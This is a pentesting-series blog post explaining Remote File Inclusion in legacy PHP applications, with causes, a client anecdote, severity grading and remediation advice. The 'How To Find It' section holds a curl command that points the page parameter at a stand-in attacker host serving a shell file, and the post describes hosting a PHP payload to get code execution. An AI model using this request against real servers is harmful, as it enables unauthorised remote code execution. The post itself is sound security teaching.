# Day 62 — Remote File Inclusion: When the Server Fetches and Executes Your Code For You

**Severity:** Critical | **Category:** File Upload & Path Traversal | **Series:** #FromDevToAttacker

---

## 🔍 What It Is

Remote File Inclusion is the more severe cousin of path traversal/LFI: instead of including a local file the traversal reached, the vulnerable code allows the "file" parameter to be a full URL — meaning the server fetches and executes code from a completely attacker-controlled remote host, with no need to first find a local file to poison or abuse.

## 🌱 Why It Exists

This is largely a legacy-PHP-configuration issue at this point — RFI requires `allow_url_include` (and typically `allow_url_fopen`) enabled in the PHP configuration, settings that were more commonly left on in older PHP deployments and have since become far less common as default hosting configurations tightened over time. Where it survives is almost always in older, unmaintained PHP applications running on infrastructure that predates the more hardened defaults now standard elsewhere in the same organization.

## ⚔️ How To Find It

```bash
curl "https://target.com/index.php?page=http://attacker-controlled.com/shell.txt"
```

Confirming `allow_url_include` is enabled is a prerequisite check worth doing directly if you have any other information-disclosure vector available (a `phpinfo()` leak, covered on Day 33, shows this setting explicitly) before spending time attempting RFI blindly.

## 💥 How To Exploit It

Once confirmed, host a PHP payload on infrastructure you control and pass its URL as the vulnerable parameter — the target server fetches and executes it directly, achieving remote code execution in a single request with no local-file staging step required at all, which is what makes this more severe and more immediate than LFI's log-poisoning chain.

## 🌍 Where This Actually Bites

In a **freight logistics** client's environment, an older PHP-based internal reporting tool — predating the rest of the organization's infrastructure modernization — still had `allow_url_include` enabled from a legacy hosting configuration nobody had revisited since the tool was first deployed years earlier. Confirming and exploiting RFI there was immediate and complete remote code execution on a host that, while "just an internal reporting tool," had network reachability to several other systems in the same segment — the age of the tool and the age of its hosting configuration were directly correlated, which is worth calling out specifically when advising a client on remediation priority across a mixed-age infrastructure estate.

## 📋 How To Report It

Grade Critical without qualification — RFI is remote code execution with essentially no additional exploitation effort required once the vulnerable configuration is confirmed. Recommend disabling `allow_url_include` (and `allow_url_fopen` where the application doesn't genuinely need it) as the immediate fix, and use the finding as a prompt to specifically audit any other legacy PHP hosts in the same estate for the same configuration — if one host was deployed with these settings enabled, others provisioned around the same time very plausibly share the same gap.

---

*Part of the #FromDevToAttacker series — real field notes from enterprise Web App &
API pentesting, one day at a time.*
